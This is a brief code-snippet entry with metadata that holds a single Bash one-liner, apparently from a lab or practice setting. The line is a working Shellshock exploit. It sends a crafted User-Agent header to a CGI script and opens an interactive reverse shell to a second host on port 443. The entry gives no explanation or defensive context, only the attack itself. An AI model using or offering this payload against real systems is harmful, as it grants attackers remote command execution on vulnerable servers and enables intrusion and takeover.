---
id: 1aff99cd-080e-4177-a853-3d4c0e64d811
type: code
language: Bash
verified: false
created_at: '2020-04-04T07:31:34.725406+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 1aff99cd

**Language**: Bash

```bash
curl http://10.10.10.10/cgi-bin/user.sh -H 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.100/443 0>&1"'
```
